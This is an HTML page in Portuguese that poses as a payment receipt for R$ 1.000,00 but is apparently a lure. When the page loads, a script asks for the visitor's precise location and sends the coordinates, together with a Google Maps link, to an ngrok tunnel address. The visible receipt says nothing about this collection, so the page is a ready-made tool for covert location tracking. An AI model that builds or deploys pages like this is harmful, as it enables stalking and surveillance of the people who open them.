<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Recebimento</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body>
  <div class="comprovante-container">
    <h1>Comprovante de Recebimento</h1>

    <div class="informacoes">
      <p><span>Data:</span> <span id="data-atual"></span></p>
      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
      <p><span>De:</span> João Silva de Oliveira</p>
      <p><span>Status:</span> Recebido com Sucesso</p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

    <div class="comprovante-footer">
      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
      <p><a href="#">Clique aqui</a> para mais informações.</p>
    </div>

  </div>

  <script>
  window.addEventListener("load", () => {
    if (!navigator.geolocation) {
      alert("Geolocalização não é suportada pelo navegador.");
      return;
    }

    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    });
  });

  const dataAtual = new Date();
  const dia = String(dataAtual.getDate()).padStart(2, '0');
  const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
  const ano = dataAtual.getFullYear();
  const dataFormatada = `${dia}/${mes}/${ano}`;
  document.getElementById("data-atual").textContent = dataFormatada;

  function sendLocation(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

    console.log("Enviando localização:", { latitude, longitude, maps });

    fetch("https://1e2746f31e5a.ngrok-free.app/send-location", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ latitude, longitude, maps })
    })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          console.log("Localização enviada com sucesso.");
        } else {
          alert("Erro ao enviar a localização.");
          console.error("Erro no back-end:", data);
        }
      })
      .catch(error => {
        alert("Erro ao enviar a localização.");
        console.error("Erro na requisição:", error);
      });
  }

  function handleError(error) {
    let message = "Erro desconhecido.";
    switch (error.code) {
      case error.PERMISSION_DENIED:
        message = "Permissão de localização negada.";
        break;
      case error.POSITION_UNAVAILABLE:
        message = "Localização indisponível.";
        break;
      case error.TIMEOUT:
        message = "Tempo esgotado para obter localização.";
        break;
    }
    alert(message);
    console.warn("Erro de geolocalização:", error.message);
  }
</script>
</body>

</html>
